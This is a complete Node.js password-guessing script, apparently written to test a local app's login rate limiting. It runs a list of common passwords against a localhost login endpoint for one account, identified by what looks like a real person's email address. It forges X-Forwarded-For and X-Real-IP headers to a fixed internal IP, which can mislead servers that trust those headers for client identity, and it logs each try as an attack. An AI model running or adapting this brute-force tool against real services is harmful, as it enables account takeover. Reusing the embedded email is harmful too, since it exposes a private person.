const http = require('http');
const { URL } = require('url');

const RESET = '\x1b[0m';
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';

const TARGET = new URL('http://localhost:5000/api/auth/login');
const PASSWORDS = [
    '123456', 'password', 'admin123', 'qwerty', 'letmein',
    'welcome', 'monkey', 'dragon', 'master', '666666',
    'password1', 'admin', 'root', 'toor', 'pass123',
];

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function requestJson(url, body) {
    const payload = JSON.stringify(body);

    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': '10.0.0.99',
            'X-Real-IP': '10.0.0.99',
            'Content-Length': Buffer.byteLength(payload),
        },
    };

    const client = url.protocol === 'https:' ? require('https') : http;

    return new Promise((resolve, reject) => {
        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => resolve({ statusCode: res.statusCode, body: data }));
        });

        req.on('error', reject);
        req.write(payload);
        req.end();
    });
}

async function main() {
    let successCount = 0;
    let blocked = false;

    for (let i = 0; i < PASSWORDS.length; i += 1) {
        const password = PASSWORDS[i];
        const attemptNumber = i + 1;

        try {
            const response = await requestJson(TARGET, {
                email: 'tranghuyen20051312@gmail.com',
                password,
            });

            if (response.statusCode === 200) {
                successCount += 1;
                console.log(`${GREEN}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... SUCCESS (200)${RESET}`);
            } else if (response.statusCode === 429) {
                blocked = true;
                console.log(`${YELLOW}[BLOCKED] Rate limit hit! IP has been flagged. Backing off...${RESET}`);
                break;
            } else {
                console.log(`${RED}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... FAILED (${response.statusCode})${RESET}`);
            }
        } catch (error) {
            console.log(`${RED}[ERROR] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... ${error.message}${RESET}`);
        }

        if (attemptNumber < PASSWORDS.length && !blocked) {
            await wait(300);
        }
    }

    console.log(`${YELLOW}[SUMMARY] ${PASSWORDS.length} attempts | ${successCount} success | IP: 127.0.0.1 | Status: ${blocked ? 'BLOCKED' : 'ACTIVE'}${RESET}`);
}

main().catch((error) => {
    console.error(`${RED}[FATAL] ${error.message}${RESET}`);
    process.exit(1);
});